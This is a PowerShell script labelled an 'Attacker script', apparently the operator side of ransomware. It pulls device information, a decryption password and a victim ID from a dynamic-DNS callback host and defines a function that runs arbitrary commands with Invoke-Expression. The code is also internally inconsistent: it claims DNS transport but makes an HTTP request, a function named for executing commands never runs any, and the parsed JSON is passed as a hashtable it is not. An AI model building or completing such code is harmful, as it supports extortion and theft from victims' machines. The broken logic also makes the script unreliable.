# Attacker script to receive device information, decryption password, and random ID over DNS

# Function to receive device information, decryption password, and random ID over DNS
function Receive-DeviceInformation {
    param (
        [Parameter(Mandatory=$true)]
        [string]$DNSAddress
    )
    
    # Receive device information, decryption password, and random ID over DNS
    try {
        $response = Invoke-WebRequest -Uri $DNSAddress -UseBasicParsing
        $deviceInfoJson = $response.Content
        $deviceInfo = ConvertFrom-Json -InputObject $deviceInfoJson
        $deviceInfo
    }
    catch {
        Write-Host "Failed to receive device information from $DNSAddress"
    }
}

# Function to execute a command on the target machine
function Execute-Command {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Command
    )
    
    # Execute the command on the target machine
    try {
        Invoke-Expression -Command $Command
    }
    catch {
        Write-Host "Failed to execute command: $Command"
    }
}

# Function to display device information received from the target machine
function Display-DeviceInfo {
    param (
        [Parameter(Mandatory=$true)]
        [hashtable]$DeviceInfo
    )
    
    # Display device information received from the target machine
    Write-Host "Device Information:"
    $DeviceInfo.GetEnumerator() | ForEach-Object {
        Write-Host "$($_.Key): $($_.Value)"
    }
}

# Function to execute commands received from the target machine
function Execute-Commands {
    param (
        [Parameter(Mandatory=$true)]
        [string]$DNSAddress
    )
    
    # Receive device information from the target machine
    $deviceInfo = Receive-DeviceInformation -DNSAddress $DNSAddress
    if ($deviceInfo) {
        Display-DeviceInfo -DeviceInfo $deviceInfo
    }
}

# DNS address to receive device information from the target machine
$dnsAddress = "examplednstest00238367.ddns.net"

# Execute commands received from the target machine
Execute-Commands -DNSAddress $dnsAddress
